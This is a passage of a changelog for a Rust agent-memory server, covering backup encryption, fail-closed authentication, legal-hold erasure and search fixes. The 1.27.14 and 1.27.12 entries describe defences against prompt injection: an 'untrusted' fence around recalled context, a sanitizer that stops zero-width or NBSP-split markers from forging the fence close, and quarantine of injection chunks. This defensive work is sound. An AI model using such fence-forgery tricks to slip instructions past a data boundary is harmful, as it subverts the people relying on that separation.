`(term, doc, col, offset)` — one row per occurrence — while the query
referenced the pre-3.40 `cnt`/`rowid` columns, so every call silently errored
into the unweighted fallback. That is now fixed and pinned by tests. No new
endpoints, no wire changes, no telemetry.

### Release notes

- **PRF corpus weighting now really runs.** The recall query-expansion path
  extracts terms via the FTS5 vocabulary — corpus document-frequency weighting
  was the design since v0.9.1, but the vocab query never executed against the
  bundled SQLite (wrong column names), degrading every expansion to the
  unweighted fallback. The queries now target the real schema, the df
  round-trip is capped (`MAX_DF_TERMS`, adversarial-vocab bound), and the
  expanded term lists are pinned by tests. Because the weighting now applies,
  expansion output CHANGES versus 1.27.17 (corpus-idf re-ranking) — recall
  eval rows will shift.
- **Release binary tuned for speed** (`opt-level` "z" → 2; LTO/strip/
  codegen-units unchanged). The server is an in-process vector store, not a
  download; "z" traded measurable recall-latency headroom for binary size.
- **Evidence enrichment batched** (one links lookup per result set, was one
  probe + one query per hit) — and the batched query's placeholder-pair bug
  (one of two `IN` groups never bound → silent empty links) is fixed and
  regression-pinned.
- **Read-seam fast path**: `sanitize_read_cow` returns the input borrowed —
  zero copies — when every transform is provably a no-op (clean rows dominate).
- **Search filters become `Arc`** (cheap clones across per-domain recall
  loops), and a process-local `VEC0_READY` flag replaces the per-query
  "does vec0 exist" probe.
- **`/domains/{name}/import` dial 1 GiB** (was capped by the global 1 MiB
  limit — the route's dedicated layer now sits before the global one; every
  other route keeps the 1 MiB cap).
- **Bug fixes:** **`/ingest/memory` could store an oversized entry or silently report
  "Empty content" for invalid UTF-8.** Both now hard-reject: per-entry content
  over `MAX_CONTENT` → `400 entry_too_large` (all-or-nothing, before any
  write), non-UTF-8 body → `400 invalid_utf8`. Every legacy wire shape is
  unchanged.
- **Entity-mention dedup was quadratic** (O(m²) containment scan per
  sentence); now a linear running-scan with the old result pinned as a test
  oracle on randomized fixtures.
- **The retention read-gate used `strftime('%s', …)` TEXT math**; the exact
  same predicate now uses `unixepoch(COALESCE(…))` — value-identical (pinned
  SQL-side) and index-friendly.
- **Connection-tracker slot leak on ingest timeout.** An `/ingest/memory`
  that exceeded the 60 s bound (and panics) kept its single-connection slot
  until the next sweep; the slot is now an RAII guard released on every exit.
- **Reserved index slots vacuumed**: `idx_knowledge_domain`,
  `idx_knowledge_owner`, `idx_knowledge_title_heading` added (domain delete,
  DSAR subject resolution, proposal write-gate dedup); `idx_tombstones_kid`,
  `idx_entities_name`, `idx_evidence_links_from` dropped (each a strict
  duplicate of a UNIQUE autoindex or newer sibling). Schema → **1.27.18**.
### Engineering record

- **The E-1 finding, documented**: `prf_df_matches_legacy_corpus_scan` +
  `prf_vocab_schema_is_occurrence_shaped` freeze the real
  `(term, doc, col, offset)` schema and pin the new queries' output to the
  mathematically-intended legacy semantics; `test_prf_extract_terms_fts_weights_corpus`
  now asserts the stemmed vocab shapes ("microbiom"/"inflamm") it quietly
  couldn't before.
- **F-44 layer-order meta-test**: `layer_semantics::import_route_accepts_large_body`
  + `other_routes_still_capped_at_1mib` rebuild the PRODUCTION two-limit
  structure so an ordering regression fails locally.
- **F-46 pinned**: `push_gate_filters_emits_unixepoch_kind_defaults` (SQL
  clause) + `retention_filter_equality_unixepoch_vs_strftime` (SQLite-side
  value equality incl. the sentinel epoch).
- **F-53 pinned**: `tracker_entry_releases_on_drop_and_panic` +
  `ingest_timeout_releases_tracker_slot`.
- Tests: server bin **673** / 6 ignored, lib **125** / 1 ignored, brain 12,
  mcp 17, bench 8; clippy `-D warnings` + fmt clean.
- Honest ceilings: `MAX_DF_TERMS` only binds on adversarial vocabularies
  (the escape hatch stays the pure fallback); F-45 is a pre-write rejection,
  not a new bound on the legacy 200-shell; the revoked-at schema defaults
  keep their TEXT `strftime` form (value-consistent single format); schema
  bumps once (the 1.27.18 migration drops three indexes on the first boot
  after upgrade). See `docs/AGENTS_HISTORY.md` for the audit trail.

---



## [1.27.17] — 2026-08-16

### Security — "Strongbox"

Server-only release (server `Cargo.toml`/lock `1.27.16` → **`1.27.17`**;
client + plugin unchanged at 1.27.15 / 0.4.4). The audit single-file-focus
release: the **backup envelope** — the one at-rest file that holds the whole
memory — gets a real key derivation + per-backup random keys, and the
plaintext snapshot it writes mid-backup is born 0600, cleaned on failure, and
never clobbers a live file. No new endpoints, no schema change, no telemetry.

### Release notes

- **Per-backup random keys (was: deterministic nonce).** A v1 backup derived
  its AES-GCM nonce from `SHA-256(passphrase || created_at)` — two backups
  within the same second reused the identical nonce (catastrophic in GCM).
  Backups now use argon2id key derivation with a random 16-byte salt and a
  random 12-byte nonce sourced per backup from the RNG (new format; legacy
  v1 files still restore).
- **Argon2id key derivation (was: SHA-256).** v1 derived the 32-byte key with
  a single SHA-256 of the passphrase — offline dictionary attacks at trivial
  cost. New backups use argon2id (64 MiB / 3 passes / 1 lane, tuned to stay
  under ~2 s on dev hardware).
- **Plaintext snapshot is 0600 at birth (was: umask-dependent).** The
  safety-snapshot / backup `VACUUM INTO` file was created with umask-derived
  permissions and chmod'd only after success — a crash inside the window left
  readable plaintext. Snapshot files are now created 0600 via `create_new`
  (a pre-existing file at the path aborts, never overwrites) and are removed
  on every failure path.
- **Restore refuses to clobber the previous safety snapshot.** Restoring over
  an existing target already preserved the pre-restore state as `<db>.bak`;
  a second restore silently failed on that file with a cryptic SQL error. It
  now fails-closed with a clear message before touching the disk.
- **Improvements:** `brain backup` gains `--format v1|v2` (default v2); restore and
  `brain doctor --backup` auto-detect both formats.
- **Improvements:** Backup refuses to run while a stale `brain.bak` exists (a swapped/truncated
  source DB was previously enshrined as the "safety snapshot").
### Engineering record

Milestone detail in `IMPLEMENTATION_PLAN_v1.27.17_Strongbox.md`. **M1** the
envelope: `BSBK` magic + u16 version + u32 length-prefixed JSON header
(`{"kdf":"argon2id","t":3,"m":65536,"p":1,"salt":…,"nonce":…,"created_at":…}`),
header bytes authenticated as GCM AAD so a bit-flip of salt/nonce/params
fails decryption; the KDF vocabulary is closed (only `argon2id` parses);
restore verifies the passphrase by decryption (no stored-key comparison),
so same-passphrase-any-header restores work; `decrypt_backup` is the single
decrypt seam for both `restore` and `verify`; legacy v1 files route to the
original decrypt path with a `warn!` (read compat forever). **M2** snapshot
hygiene: `vacuum_into` (SQL-quote-escaped literal, unit-pinned),
`create_private_file` (0600 + `create_new`), `SnapshotGuard` removes the
plaintext snapshot on every error path (pinned by an unreadable
config-dir failure injection). **M3** restore integrity: manifest xxh3 vs
decrypted snapshot, done work against the decrypted bytes before the live DB
is touched; `.bak` pre-existence both sides fails closed (F-17's
stale-bak-enshrined trap closed). **M5** the `--format` flag routes through
`backup_with_config_dir_and_format` (now `pub`). Tests: lib **124** / 1
ignored (incl. **20** backup tests: roundtrip, same-second nonce
uniqueness, v1 read-compat, tamper rejection, wrong passphrase, Argon2id
< 2 s soft benchmark, 0600-at-birth, planted-path refusal, failure-guard
cleanup, quote escaping, .bak clobber refusal); bin **659** / 6 ignored;
brain 12, mcp 17, bench 5; clippy `-D warnings` + fmt clean. Live E2E smoke on
a scratch DB: v2 backup → `doctor --backup` verify → restore (`.bak`
0600) → v1 backup restores → wrong passphrase rejected on both `doctor` and
`restore`. Honest ceilings: the passphrase remains the only secret (no
KMS/rotation); the safety snapshot is the rollback path, not a journal —
restoring twice requires moving the `.bak` (fail-closed by design);
v1 files are never migrated in place. See `CHANGELOG.md` §[1.27.17].



## [1.27.16] — 2026-08-16

### Security — "Drawbridge"

Server-only release (server `Cargo.toml`/lock `1.27.15` → **`1.27.16`**;
client + plugin unchanged at 1.27.15 / 0.4.4). The fail-closed pass over the
**identity + read** surfaces the audit itemized: auth degrades closed instead
of open, trust labels are closed vocabularies at the write boundary, the
multi-db domain registry gains a registration cap (a probeable API can no
longer create files), and JWT-principal reads honor the domain label on every
by-id / search / graph seam. No new endpoints, no new columns, no telemetry.

### Release notes

- **Auth degrades closed, never open.** A poisoned token-store lock was an
  empty set → "auth disabled" → allow-all; it is now fail-closed
  `500 auth_store_unavailable`. A configured-but-empty token store (file or
  env set, zero tokens) denied everything; it now returns 401 instead of
  reading as "no auth". The JWT revocation check (v1.2.0) skipped itself on
  ANY pool/SQL error (`if let Ok(conn)` + `unwrap_or(false)`); any store
  failure now denies. The role-retrieval gate (v1.23.0) degraded to "no
  narrowing" (read everything) on a pool/role-store error; it now degrades to
  the empty permit (read nothing) with a `warn!`. `/auth/logout` is no longer
  a public route: the presented access token is verified by the middleware
  first — an unauthenticated "logout" could only ever succeed at revoking
  nothing.
- **The multi-db domain registry is now registered-only and capped.** In
  `BRAIN_MULTI_DB=true`, `pool_for` NEVER opens a file for an unregistered
  name (previously any probeable read created `brain-<name>.db` lazily —
  unbounded disk fill). `POST /domains` is the one creation path, bounded by
  `BRAIN_MAX_DOMAIN_DBS` (default 256; 507 `insufficient_storage` beyond it);
  every resolution read of an unknown name returns the probe-blind 404
  `domain_unknown` (indistinguishable from an empty-but-real domain). The
  clients-register boot seed keeps client domains resolvable if their file
  vanished between boots (recreated on first access, still cap-bounded).
- **JWT principals are domain-scoped on reads.** `/search` now authorizes
  against the domain it actually queries (was always `global`). `/get/{id}`
  and `/multi-get` bind the header's `X-Brain-Domain` label in SQL — an id
  can never cross domains in shim mode — re-authorize on the row's own
  domain, and run the same record gate (v1.14 scopes + v1.23 roles) recall
  enforces; foreign rows read as 404 / are dropped, never loud. Recall
  federation and graph traversal drop foreign-domain targets before any
  search runs; shim-mode graph edges scope by their chunk's provenance label
  (an unlinked edge is invisible to scoped readers).
- **Trust labels are closed vocabularies at the write boundary.** `/ingest`
  rejects an unknown/mixed-case `memory_kind` (400 `invalid_memory_kind` —
  no silent fallback to `fact`) and a `confidence` outside `0.0..=1.0` (400
  `invalid_confidence` — no silent clamping, a clamped lie hides the liar);
  the proposal path (`/proposals`) enforces the same strict kind round-trip.
  A JWT (agent) principal on `/add` may only use the closed `source`
  vocabulary (ingest kinds + connector family kinds) — `manual`, the
  `origin:human` marker, is excluded so a token-authenticated agent cannot
  forge human authorship. The UMP L3 operator signing key now fails closed to
  L2 on a group/world-readable seed file (same 0600 enforcement the other
  secrets get).
- **The per-IP rate limiter actually was not per-IP.** The serve wiring never
  injected the peer `SocketAddr` extension, so every client shared ONE
  "unknown" bucket — a global rate limit in practice. The server now serves
  with `into_make_service_with_connect_info`, buckets are keyed by remote
  address (production-behavior pinned by a source-inspection test), and the
  bounded key set (`RATE_LIMIT_MAX_KEYS`) evicts the oldest 25% rather than
  growing unbounded.
### Engineering record

None.
None.
- **M1 (F-04/F-05/F-06) — the domain read-gate.** `handlers::can_read_domain`
  / `authorize_read_domain` (pure scope predicate, `read:team/*` =
  read-everywhere; loopback/opaque unchanged superuser); `resolve_domain_pool`
  flattened onto `map_domain_error`; `gate::RecordReadGate` (+
  `record_read_gate`) = the composite (access_scopes, owner_in) pair; SQL
  domain predicate + row-domain re-auth on `/get/{id}` + `/multi-get`;
  `targets.retain(can_read_domain)` on recall federation + `traverse_graph`
  (explicit forced domains stay loudly 403); `graph_domain_scope` +
  `entity_relations`/`relations_for`/traverse `?domain` clauses in shim mode.
- **M2 (F-07) — per-IP rate limiting.** `into_make_service_with_connect_info
  ::<SocketAddr>`; source-pin test that the wiring survives; bounded
  `RateLimiter` key set + eviction tests.
- **M3 — fail-closed identity.** M3.1/F-26 `auth::TokenRead`
  (NotConfigured|Active|ReadFailed) + configured-but-empty denies; M3.2/F-27
  `role_retrieval_gate` empty-permit degradation (+ `AND 1 = 0` predicate
  guards for empty sets — SQLite has no `IN ()`); M3.3/F-28 revocation check
  fails closed on store errors; M3.4/F-13 `/auth/logout` behind the bearer
  middleware; M3.5/F-25 UMP operator-key seed refuses wide modes.
- **M4 (F-33) — write-boundary trust labels.** `MemoryKind::is_strict_valid`
  (round-trip) in the proposal + ingest gates; `confidence` ∈ 0.0..=1.0;
  M4.3 `/add` closed `source` vocabulary for JWT principals
  (`ADD_SOURCES_FOR_JWT`; `manual` excluded).
- **M5 (F-41) — the domain-registration cap.** `MAX_DOMAIN_DBS` = 256
  (`BRAIN_MAX_DOMAIN_DBS` override), `DomainRegistry::register` (the ONE
  creation path) / `seed_registered` (boot-time, no eager pools) / registered
  `pool_for` (refuses `Unknown`, never creates); clients-table boot seed;
  `map_domain_error` seam: 400 `domain_invalid` / 404 `domain_unknown` / 507
  `insufficient_storage` / 500 internal. All `pool_for` call sites and test
  helpers migrated to `register`.
- **Contract:** openapi.yaml — `/auth/logout` described behind the bearer
  middleware; `/add` `source` vocabulary; `/ingest` `memory_kind` +
  `confidence` fields + 400 codes; `POST /domains` 507; NotFound note on
  `domain_unknown`. The `x-api-version` stamp stays `"1.21.0"` (no wire-shape
  change; the runtime header follows `CARGO_PKG_VERSION`).
- Tests: server bin **659** passed / 6 ignored (was 643 — +16, all in the new
  M1–M5 suites), lib **113** / 1 ignored, mcp 17, brain 12, bench 5; client
  131 untouched. clippy `-D warnings` + fmt clean; `badges.sh --selfcheck`
  clean. UMP conformance drops to **L2** when the operator key is refused for
  wide modes (by design, fails closed).
- Honest ceilings: the record gate + domain predicates are read-time
  enforcement over stored rows — a row's `domain`/`scope`/`owner` are still
  honored as written (a write that stores a wrong label is out of scope);
  the graph edge scope keys on the chunk link, so an edge whose
  `knowledge_id` is NULL has no domain atom and is invisible to scoped
  readers (loopback/opaque see it); the capacity cap bounds multi-db
  registrations — shim mode shares one file and is untouched by it;
  fail-closed degradation means a role-store outage denies retrieval (the
  empty permit) rather than serving all rows — availability-first operators
  should monitor for the `warn!`. Code-block safety, quarantine, and fence
  integrity surfaces unchanged from v1.27.15.

---



## [1.27.15] — 2026-08-16

### Minor — "Holdall"

Server + client release (server `Cargo.toml`/lock `1.27.14` →
**`1.27.15`**; client `Cargo.toml`/lock `1.27.13` → **`1.27.15`**; plugin
unchanged at 0.4.4). Two independent lines: the **server** closes the remaining
legal-hold erasure gaps (the fence becomes universal and the erase trails
carry deletion evidence), and the **client** re-works the offline destruction
queue so an irreversible action can never auto-fire on reconnect.

### Release notes

- **Improvements:** The legal-hold fence (v1.22.0) now guards **every** erasure path, not just
  `/purge` and DSAR: `DELETE /memory/{id}`, `DELETE /sources/{id}`,
  `/sources/reconcile` sweeps, `DELETE /quarantine/{id}` and
  `DELETE /domains/{name}` all refuse with the same `409 legal_hold_active`
  envelope while any target chunk is under an active hold — all-or-nothing,
  inside the same transaction as the delete. The known audit exploit (hold a
  chunk, then retire its source with `{"live": []}`) is closed at the
  preflight.
- **Improvements:** The deletion registry now carries the same SHA-256 content digest on
  single-chunk memory deletes that `/purge` writes — every erase trail records
  identical deletion evidence.
- **Improvements:** Deleting a domain no longer erases its audit chain: the domain's audit
  segment is exported to `<data>/archives/<domain>-audit-<date>.ndjson`
  (0600) before the rows go, the in-file `audit_events` survive, and a
  `domain_deleted` event is appended to the surviving chain.
- **Improvements:** Strict-posture domains erase with teeth: DSAR purges and memory deletes run
  `PRAGMA secure_delete=ON` + a `wal_checkpoint(TRUNCATE)` after commit, and
  the deletion certificate discloses the honest remanence posture verbatim —
  `secure_delete+checkpoint (backup files excepted)` for a strict domain, the
  disclosed logical posture otherwise. Best-effort profile lookup: an
  unreadable/missing bind never fails closed into a lie.
- **Improvements:** Hold release now carries the DPO/admin dual gate (the same seam a breach
  close uses), and the Art-30 transfer-register row lands atomically with its
  audit row (SAVEPOINT inside the write tx).
- **Improvements:** A fenced code block can no longer produce a single oversized chunk: the
  chunker now hard-caps code blocks at 8× the regular cap and splits any
  over-limit block at newline boundaries, re-opening the fence with the same
  info string on every continuation piece.
- **Improvements:** (Client) a queued Purge/DSAR action **never auto-replays** on reconnect:
  destructive actions park in the offline queue and surface as an explicit
  review banner with their queue write time, per-row dismiss, and a
  "keep + clear" decision. The offline envelope stores an anonymous SHA-256
  `subject_hash` — the raw subject never persists — and replay re-prompts for
  it.
- **Improvements:** (Client) destruction confirmation is now a shared two-step component behind
  a preview gate: the DSAR wipe confirms only while a fresh footprint preview
  is on screen, and editing the subject input after arming re-freezes the
  confirm.
### Engineering record

- **Holdall M1 (F-02):** `legal_hold::refuse_if_held` — one guard, one
  envelope. Wired into `forget.rs`, `sources.rs`/`handlers/sources.rs`,
  `main.rs` (`AppError::Conflict` → 409 on the legacy quarantine path),
  `handlers/domains.rs` (domain-wide hold preflight).
- **M1.3:** memory-delete tombstones gain `content_hash`; **M1.4:**
  `export_audit_segment` + `audit_events` preserved + `domain_deleted` event.
- **M2/M2.1/M2.2 (F-24):** `secured_remanence` threaded through
  `run_dsar_pool`/`run_dsar_subject` + the forget path; `physical_purge`
  certificate field disclosed.
- **M3 (F-51):** hold-release DPO gate reuses `require_dpo_role`
  (pub(crate)); transfer Art-30 row + audit atomic via SAVEPOINT.
- **M5 (F-52):** `MAX_CODE_CHUNK_BYTES` (8× normal) + `split_oversized_code`.
- **Client M4:** `queue.rs` split/replay rework (parked subset, `queued_at`,
  `subject_hash`, `take_replayable`), `replay.rs` restored-queue row
  component + banner, shared `confirm.rs::ConfirmDestructive`, DSAR preview
  gate in `subjects.rs`, quarantine/system/data wipe confirms, `sha2` dep
  (hand-rolled hex, +~30 KB wasm).
- Tests: server bin **643** passed / 6 ignored (default + `--features bench`;
  otel **645** / 6), lib **113** / 1 ignored, mcp 17, brain 12, bench 5;
  client **131**; `badges.sh --selfcheck` clean (**809 passed**, UMP L3);
  clippy `-D warnings` (default, bench, otel), fmt clean, `cargo audit`
  clean (2 pre-existing allowed advisories), release build + wasm release
  (5.24 MB < 7 MB budget) clean.
- Honest ceilings: the hold fence guards chunk rows — source/domain deletion
  preflights via chunk membership, so a source with no held chunk still
  deletes; `secure_delete`/WAL-truncate are best-effort hygiene (a checkpoint
  failure never fails the erasure, and the certificate discloses — it cannot
  guarantee — remanence; backup files are excepted); the client banner is a
  UI surface, the parked queue is the enforcement; offline replay success is
  detected via the same idempotency shapes as the approval queue
  (replay_applied).

---



## [1.27.14] — 2026-08-16

### Patch — "Fencepost2"

Server + plugin patch release (server `Cargo.toml`/lock `1.27.13` →
**`1.27.14`**; plugin `0.4.3` → **`0.4.4`**; client unchanged at 1.27.13).
Landing the information-flow-integrity follow-up: the `untrusted` fence
becomes a structural (not decorative) boundary on every LLM-facing seam, and
the quarantine taint can no longer be lost or silently written.

### Release notes

- **Bug fixes:** The plugin's block sanitizer stripped the fence sentinels *before* normalizing
  whitespace, so a near-marker that a transform then synthesized (e.g. a
  `CONTEXT`–`END` boundary with an NBSP/TAB/zero-width split) could forge the
  fence close after it was already removed. The sentinel strip now runs last —
  after every transform that can create or shorten a marker — and the invisible
  class is stripped before whitespace collapse so `U+FEFF` is removed rather
  than widened to a space.
- **Bug fixes:** The recall `snippet` field was the one detail value handed to the host without
  passing through the block sanitizer; it now goes through the same boundary as
  title and content.
- **Improvements:** Every stored-content read surface on the server (UMP reads, legacy `/search`,
  `/quarantine` review list, recall/suggest metadata) now routes through a
  single sanitize seam — the same bidi/zero-width/markdown-ref boundary the
  recall path already used. A wiring meta-test pins the seam to every
  response-forming site, so a future read path that emits stored text without
  it fails the suite.
- **Improvements:** The MCP tool-result seam now wraps results in the same untrusted fence the
  plugin uses, and strips control characters — an MCP host gets the structural
  data/instruction boundary on the wire too. The `brain` CLI recall/get prints
  gain the same strip parity.
- **Security fixes:** The quarantine flag write now **fails closed**: `flag_if_quarantined` returns
  a `Result`, and every ingest path (structured, procedure, `/add`, `/ingest/
  memory`) rolls back or errors rather than store an injection chunk with a
  silently-missed flag. Separately, `/ingest/memory` now flags a `Reject`
  verdict (stricter, never dropped) under the default quarantine posture — a
  hit the classifier is confident about is excluded from retrieval, not stored
  cleanly.
### Engineering record

- **Plugin (F-01):** `sanitizeForBlock` order changed from
  strip-sentinels-first to strip-last; the `\s`-collapse now runs after the
  `U+E0000–U+E007F`-inclusive invisible strip so `U+FEFF` (which JS `\s`
  treats as whitespace) is removed, verified by a new near-marker forgery
  suite (NBSP/TAB/VT/double-space/ZW/ZWNJ/FEFF × BEGIN/END). New regression
  caught on the openclaw tree: FEFF widened to `"ig nore"`; now stripped to
  `"ignore"`. All 142 extension tests pass.
- **Server read-seam (M3):** `sanitize_read(_opt)`/`sanitize_stored` in
  `src/gate.rs`; UMP reads sanitize a clone of the row (integrity stays
  self-consistent); fixes the borrow-lifetime fallout of the owned `row_owner`
  copy in `ump_ops.rs`.
- **MCP/CLI (F-20/F-63):** shared `FENCE_BEGIN`/`END` + `strip_markdown_refs`
  + `strip_control_chars` in the new `src/fence.rs`; `tool_result_payload`
  wraps results, `format_response` + `brain` prints gain parity.
- **Quarantine fail-closed (F-15):** `flag_if_quarantined` →
  `rusqlite::Result<bool>` propagated through `handlers/ingest.rs`,
  `handlers/procedure.rs`, and the `main.rs` `/add` + `/ingest/memory` paths.
- Tests: server bin **627** passed / 6 ignored, lib **113** / 1 ignored, brain
  12, mcp **17** (`--features bench`); client 124 unchanged; plugin **142**
  extension tests (openclaw `vitest`); clippy `-D warnings` + fmt clean;
  `badges.sh --selfcheck` clean; UMP L3.
- Honest ceilings: the fence is transport-layer data/instruction separation,
  not a CaMeL/FIDES capability lattice; the restore in `main.rs` rollback path
  drops the uncommitted tx (chunk never stored) rather than re-flagring; the
  `snippet` strip is a single point, not a re-run of the full screen; plugin
  is validated via the openclaw `vitest` suite + `tsc`, the standalone runner
  does not exist here.

---



## [1.27.13] — 2026-08-16

### Patch — "Contract"

Server + client patch release (server + client `Cargo.toml`/locks
`1.27.12` → **`1.27.13`**; plugin **0.4.3**, first released here). Ships the
two post-1.27.12 integrity fixes and completes the documentation contract:
every documented endpoint now states its response body.

### Release notes

- **Bug fixes:** Client: detail-modal approvals now forward the server `content_digest`
  like the queue and batch paths already did — previously a modal approval
  sent no digest, so a drifted (tampered or stale) proposal could still be
  approved from the detail view. The decision now binds to the bytes
  displayed in every client path.
- **Bug fixes:** Plugin: the provenance tag labels (`src`/`mk`/`lb`/`reg`) rendered inside
  the `UNTRUSTED_*` fence now run through `sanitizeForBlock` like hit
  bodies — a recalled chunk can no longer forge its own attribution line
  or break the fence markers through a label.
- **Improvements:** The OpenAPI contract (`GET /openapi.yaml`) now documents the response
  body of every `200`/`201` endpoint: 51 previously description-only
  responses carry wire-exact examples, and `/auth/logout` is corrected to
  its real contract (204 on success, 401 when no principal is presented).
- **Improvements:** Docs: the endpoint inventory in `docs/api.md` and the README API tables
  now cover the full v1.21–v1.27 surface (profiles, roles, connectors,
  domains, clients register, cross-border transfers, breach, legal hold).
- **Security fixes:** None beyond the two integrity bug fixes above (no new surface; the
  fixes close gaps in the v1.27.12 features).
### Engineering record

- **Client fix:** `client/src/panels/review.rs` `DetailActions` now passes
  `Some(&digest)` (previously `None`), matching the queue quick-approve and
  batch paths. The key-accelerator quick-approve, ops panel, and offline
  replay still deliberately pass `None` (the documented legacy path; the
  server enforces the binding only when a digest is present).
- **Plugin fix:** the `[src: · mk: · lb: · reg:]` provenance line (v1.27.12)
  labels pass through the same sanitizer as hit bodies before rendering.
- **Contract pass:** `openapi.yaml` examples were extracted from the
  handler sources (BreachView, Transfer, TiaTemplate, DpaTerms, Client,
  LegalHoldRow, DsarResponse, DsarLedgerRow, AuditRow, capabilities, recall
  trace, ProposalView), not guessed; YAML validated and
  `test_openapi_covers_routes` + `authz_gates_cover_every_non_public_route`
  re-pinned. The `x-api-version: "1.21.0"` contract stamp is unchanged
  (the wire contract did not move; the runtime `X-Api-Version` header
  follows `CARGO_PKG_VERSION` as before).
- Tests: server bin **626** passed / 6 ignored, lib 105 / 1 ignored, brain
  12, mcp 15, bench 5 (`--features bench`); client **124** passed; clippy
  `-D warnings` + fmt clean on both trees; `cargo audit` clean (2
  allowlisted warnings); UMP conformance **L3**; recall eval gate r@5 0.919
  / r@10 0.919 / mrr 0.905 (floor 0.850).
- Honest ceilings: the contract pass documents shapes that were already
  shipping — it changes no wire behavior; the detail-modal fix binds the
  digest but legacy no-digest approvals remain accepted by design
  (backward compat); ROADMAP.md's Caliber-line header is intentionally not
  touched (the v1.27 line has never updated it).

---



## [1.27.12] — 2026-08-15

### Security — "ReviewArmour · Rotate · Provenance"

Server + client + plugin security release against the 2026 agentic-AI threat
landscape (OWASP Agentic Top 10 / MS AI Red Team v2 lines): the HITL approval
now binds to the bytes the reviewer was shown, ambient bearer tokens can be
retired, and recalled context carries its provenance into the prompt.

### Release notes

- **Security fixes:** Review approvals now bind to the displayed bytes: `/proposals` returns the
  read-canonical review form + a stable `content_digest`; approving with a
  stale digest is rejected (`409`). The reviewer's decision can no longer
  bless content that recall would render differently.
- **Security fixes:** Recalled context now carries per-hit provenance tags (ingest kind, memory
  kind, lawful basis, region) inside the untrusted-data fence, so the model
  can attribute — not just trust — what it recalls.
- **Security fixes:** The operator CLI can now rotate the server bearer token (`brain token
  rotate`), retiring a leaked copy; server startup warns when a webhook sink
  is unsigned or the UMP signing key is group/world-readable.
- **Improvements:** No new storage, no new tables, no telemetry. All changes ride the existing
  seams (read seam, recall wire, CLI).
### Engineering record

- **ReviewArmour (gate.rs):** `list_proposals` serves the read-canonical
  `content` (`sanitize_read`: PII redaction → markdown-ref strip →
  invisible-Unicode strip) alongside a stable, principal-independent
  `review_digest` over the stripped form (PII kept *out* of the fingerprint so
  admin and non-admin readers see the same digest). `approve_proposal` accepts
  an optional `digest` (backward-compatible: `None` = legacy quick-approve /
  offline-replay) and returns `409` on any drift.
- **Rotate (brain CLI):** `token rotate` generates a fresh 32-byte hex token,
  atomically rewrites the token file (0600; fail-closed on group/world-readable
  secrets) and prints the operator-side `BRAYN/BRAIN_SERVER_AUTH_TOKEN`
  coordination step — the server never unilaterally rewrites the openclaw env
  source. Startup warnings added for unsigned webhook sinks (alert/DSAR) and
  loose UMP signing keys.
- **Provenance (search/handlers/plugin):** `knowledge`'s stored `source`
  (ingest kind), `node_kind` (memory kind), `lawful_basis`, `region` are now
  selected by the vec0 + FTS retrievers, threaded through fusion, and
  serialized on `RecallHit` (all `Option<String>`, absent when null). The
  plugin renders a deterministic per-hit `[src: · mk: · lb: · reg:]` line
  inside the `UNTRUSTED_...` fence; `brain-client.ts` hit/wire types extended.
- Tests: server bin **626** passed / 6 ignored (search 72, recall 23, gate 50,
  results_to_hits 7 incl. the new provenance-forwarding pin); brain bin 12;
  clippy `-D warnings` + fmt clean.
- Honest ceilings: approve *binds* — it does not force full-read or rewrite
  at-rest rows; `token rotate` coordinates the file only (the env source is a
  printed step, not auto-edited); provenance tags are labels, not an enforced
  taint/declassification policy; the optional domain-isolation federation flag
  ("Boundary") is intentionally not in this release (it changes recall
  breadth and ships gated).

---



## [1.27.11] — 2026-08-15

### Client — "Console"

The series capstone (Release 10 of 10). Client `Cargo.toml`/lock
`1.23.0` → **`1.27.11`**; **server + plugin unchanged**. The client release that
turns the R1–R9 register/roles server surfaces into the role-gated BPO
dashboard views.

### Release notes

- **Improvements:** New **Clients** panel, role-gated: a `client-auditor` gets their own
  single-client dashboard (read-only, domain-scoped), and `bpo-ops`/admin get
  the all-clients operations board (register + connector status + review-queue
  depth).
### Engineering record

`role.rs` gains `ConsoleView` + `console_view()` (pure): `client-auditor` →
`ClientAdmin`, `bpo-ops` + the full-control roles (`admin`/`solo`/`controller`)
→ `BpoOps`, nothing else (no roles / agent / staff) → `Undefined` (the existing
panel gating governs). `main.rs` adds `Route::Clients {}` gated into both the
desktop rail and mobile tab bar only when `console_view` resolves, plus a
palette entry + keyword registration (palette coverage test 14 → 15 targets).
`panels/console.rs` implements the two panels; `client_admin` is the honest
single-tenant-per-client poster — it renders only the clients granted by the
client-side allowlist (`api::client_auditor_domains`, the token mirror of the
server `client_authorized_domains` seam) and has NO client switcher, while the
server R9 row filter is the backstop (defense-in-depth, with
`filter_granted` as the pure re-filter — `Some([])` renders nothing,
deny-by-default). `bpo_ops` is read-only: `/clients` register + `/connectors`
status + `/proposals` pending depth. i18n (`nav_clients` + `console_*` keys in
en; de/fr/es/nl fall back). Tests: client 119 → **122** passed (+
`client_admin_view_never_renders_foreign_clients`, `connector_state_maps_to_color`,
and the `console_view` preset pins); clippy `-D warnings` + fmt clean; release
wasm 5.1 MB (budget 7 MB). Honest ceilings: the console is read-only UI over
the shipped API — no new server surface (the full client-admin Overview/Data/
Rights/Audit panels named in the plan reduce to the register overview here; the
rest are the existing panels the server gates per-role); `client-auditor` tokens
are operator-issued (scopes → client domain); the OS-keyring/bearer token
provenance is unchanged. See
`IMPLEMENTATION_PLAN_v1.27.11_Console.md`.

---


## [1.27.10] — 2026-08-15

### Server — "Roles (hardening)"

Release 9.1 follow-up. Server `Cargo.toml`/lock 1.27.9 → **1.27.10**; schema
unchanged (**1.27.8**); client + plugin unchanged. The deep-review pass over
v1.27.9.

### Release notes

- **Improvements:** Hardened the `client-auditor` grant: the operator `global` root domain is
  never a valid auditor target (the min-necessary wedge cannot widen to the
  operator pool), and the `/clients` list filter is now type-safe over the
  register rows.
### Engineering record

Three refinements to the v1.27.9 seam, behavior-preserving for the shipped
path: `auth::client_authorized_domains` excludes `global` (in addition to `*`)
from an auditor's allowlist; `list_clients` filters the typed
`Vec<crate::clients::Client>` before serialization (stringly-typed serde-key
filtering removed, less allocation) and returns an empty list (not 404) for a
misconfigured zero-grant auditor — still deny-by-default; `get_client` computes
the allowlist once instead of twice. Tests: server bin 619 → **620** / 6
ignored (added `client_auditor_with_no_granted_domain_sees_nothing`), lib 105
(+ preset-level `can == ["read"]` wedge pins for `client-auditor` + `bpo-ops`);
clippy `-D warnings` + fmt clean; CI green. Honest ceiling unchanged — a read-
time row filter on one register, not multi-tenancy (v2.0 Cortex).

---



## [1.27.9] — 2026-08-15

### Server — "Roles"

Release 9 of 10 of the BPO Ops series. Server `Cargo.toml`/lock 1.27.8 →
**1.27.9**; schema unchanged (**1.27.8**); client + plugin unchanged.

